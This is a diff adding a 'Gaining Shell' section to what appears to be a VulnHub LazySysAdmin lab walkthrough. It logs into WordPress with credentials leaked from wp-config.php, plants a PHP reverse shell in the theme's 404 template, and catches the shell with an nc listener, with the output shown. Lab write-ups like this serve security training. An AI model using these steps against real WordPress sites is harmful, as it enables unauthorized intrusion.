@@ -143,12 +143,37 @@ define('DB_USER', 'Admin');
 define('DB_PASSWORD', 'TogieMYSQL12345^^');
 ```
 
+## 3.Gaining Shell
 
+we can not connect to mysql remotely but can connect to wordpress admin panel using the credentials found in `wp-config.php`:
 
+![wordpress panel](https://github.com/Git-K3rnel/VulnHub/assets/127470407/f0e53320-202e-4a26-958d-b0f565a74b04)
 
+now it is easy to get a reverse shell.
 
+upload pentestmonkey php reverse shell into this path :
 
+```text
+Appereance -> editor -> 404 Template
+```
 
+![404](https://github.com/Git-K3rnel/VulnHub/assets/127470407/2946e356-e603-4c32-b6cd-667455beccb5)
+
+start a listener and navigate to `192.168.56.106/wordpress/wp-content/themes/twentyfifteen/404.php`
+
+```bash
+root@kali: nc -nvlp 4444
+
+listening on [any] 4444 ...
+connect to [192.168.56.102] from (UNKNOWN) [192.168.56.106] 34822
+Linux LazySysAdmin 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux
+ 01:26:57 up  5:00,  0 users,  load average: 0.00, 0.00, 0.16
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
 
 
 
